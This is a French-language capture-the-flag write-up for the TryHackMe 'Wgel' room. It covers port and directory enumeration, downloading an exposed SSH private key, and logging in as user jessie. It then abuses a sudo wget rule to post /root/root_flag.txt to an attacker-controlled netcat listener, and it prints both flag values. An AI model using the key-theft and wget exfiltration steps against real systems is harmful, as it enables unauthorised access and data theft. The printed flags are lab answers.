# Wgel CTF #

Énumérons l'adresse la cible avec nmap.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nmap -A 10.10.131.111
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 17:49 CEST
Nmap scan report for 10.10.131.111
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
```

On voit deux services ouvert :  
- SSH sur le port 22
- html sur le port 80

D'après le titre du site  : Apache2 Ubuntu Default Page: It works, c'est la page par défaut d'Apache.

On va regarder avec gobuster si y a des liens intéressants.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://10.10.131.111 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.111
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/14 17:58:01 Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 316] [--> http://10.10.131.111/sitemap/]
/server-status        (Status: 403) [Size: 278]                                    
Progress: 119260 / 220561 (54.07%)                                                ^C
[!] Keyboard interrupt detected, terminating.
                                                                                   
===============================================================
2021/07/14 18:06:06 Finished
===============================================================

```

En premier on trouve /sitemap/  
On refait un coup de gobuster sur /sitemap/  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://10.10.131.111/sitemap/ -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.111/sitemap/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/14 18:05:41 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.131.111/sitemap/.ssh/]
/css                  (Status: 301) [Size: 320] [--> http://10.10.131.111/sitemap/css/] 
/fonts                (Status: 301) [Size: 322] [--> http://10.10.131.111/sitemap/fonts/]
/images               (Status: 301) [Size: 323] [--> http://10.10.131.111/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]                                         
/js                   (Status: 301) [Size: 319] [--> http://10.10.131.111/sitemap/js/]    
                                                                                          
===============================================================
2021/07/14 18:06:00 Finished
===============================================================
```

On quelque chose le répertoire .ssh, regardons-le.

```
tim@kali:~/Bureau/tryhackme/write-up$ lynx http://10.10.131.111/sitemap/.ssh/
ICO] Name Last modified Size Description
     ________________________________________________________________________________________________________________________________________________________________________________________________________________________________

   [PARENTDIR] Parent Directory   -
   [ ] id_rsa 2019-10-26 09:24 1.6K
     ________________________________________________________________________________________________________________________________________________________________________________________________________________________________


    Apache/2.4.18 (Ubuntu) Server at 10.10.131.111 Port 80
```

On a un fichier id_rsa  
Récupérons-le  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget  http://10.10.131.111/sitemap/.ssh/id_rsa
--2021-07-14 18:19:25--  http://10.10.131.111/sitemap/.ssh/id_rsa
Connexion à 10.10.131.111:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 1675 (1,6K)
Sauvegarde en : « id_rsa »

id_rsa                                                      100%[=========================================================================================================================================>]   1,64K  --.-KB/s    ds 0s      

2021-07-14 18:19:25 (5,52 MB/s) — « id_rsa » sauvegardé [1675/1675]
```

Nous avons pas le nom d'utilisateur.
Regardons les commentaires dans le code source de la page par défaut.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://10.10.131.111/ | grep -F '<!--'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11374  100 11374    0     0  58030      0 --:--:-- -  <!--
-:--:-- --:--:-- 58030
<!--      <div class="table_of_contents floating_element">
 <!-- Jessie don't forget to udate the webiste -->
```

On voit ici que le nom de l'utilisateur est : Jessie  

***

Connectons-nous.
```bash
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa 
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa jessie@10.10.131.111
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```

Avec le nom et le fichier qui contient la clef avec le bon droits le fichier on obtient un accès.  

***

Récupérons le premier flag  

```bash
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
```

Le User flag est : 057c67131c3d5e42dd5cd3075b198ff6

***
Trouvons moyen d'être Root.  

```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

D'après la configuration de sudo, on peut exécuter /usr/bin/wget avec les droits root.

Nous pouvons dire à wget d'envoyer notre fichier à une adresse.  

Sur la machine de l'attaquant on écoute le port 80.  
```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 80
listening on [any] 80 ...

```

Sur la machine cible on envoie le fichier.  
```bash
jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.9.228.66
--2021-07-14 20:07:10--  http://10.9.228.66/
Connecting to 10.9.228.66:80... connected.
HTTP request sent, awaiting response...
```

On a comme réponse.  
```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.131.111] 35706
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.9.228.66
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

Le second flag est : b1b968b37519ad1daa6408188649263d  